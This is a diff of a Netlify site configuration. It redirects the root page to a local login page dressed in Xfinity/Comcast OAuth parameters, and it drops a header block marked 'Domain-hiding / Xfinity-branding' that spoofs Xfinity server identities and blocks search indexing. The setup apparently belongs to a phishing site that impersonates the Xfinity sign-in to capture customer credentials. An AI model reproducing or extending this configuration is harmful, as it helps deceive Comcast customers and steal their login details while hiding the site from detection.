@@ -3,11 +3,11 @@
   publish = "dist"
 
 [build.environment]
-  NODE_VERSION = "20"
+  NODE_VERSION = "18"
 
 [[redirects]]
   from = "/"
-  to = "/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dmy-account-web%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foverview%26response%3D1&reqId=b4f27a31-8c9e-4d1b-a5f6-3e7d2c8b9a01&ui_style=light&lang=en"
+  to = "/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize"
   status = 302
 
 [[redirects]]
@@ -22,29 +22,6 @@
 
 [functions]
   node_bundler = "esbuild"
-
-[[headers]]
-  for = "/*"
-  [headers.values]
-    X-Frame-Options = "DENY"
-    X-Content-Type-Options = "nosniff"
-    Referrer-Policy = "no-referrer"
-    Permissions-Policy = "interest-cohort=(), browsing-topics=()"
-    X-Robots-Tag = "noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate"
-    X-Download-Options = "noopen"
-    X-Permitted-Cross-Domain-Policies = "none"
-    Cache-Control = "no-store, no-cache, must-revalidate, private"
-    Pragma = "no-cache"
-    Expires = "0"
-    Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://login.xfinity.com https://*.xfinity.com data:; font-src 'self' data:; connect-src 'self' https://login.xfinity.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
-    # Domain-hiding / Xfinity-branding headers
-    Server = "Xfinity-Gateway"
-    X-Powered-By = "Xfinity-Platform"
-    Via = "1.1 login.xfinity.com"
-    Strict-Transport-Security = "max-age=31536000; includeSubDomains; preload"
-    X-DNS-Prefetch-Control = "off"
-    Cross-Origin-Opener-Policy = "same-origin"
-    Cross-Origin-Resource-Policy = "same-origin"
 
 [[headers]]
   for = "/.netlify/functions/*"
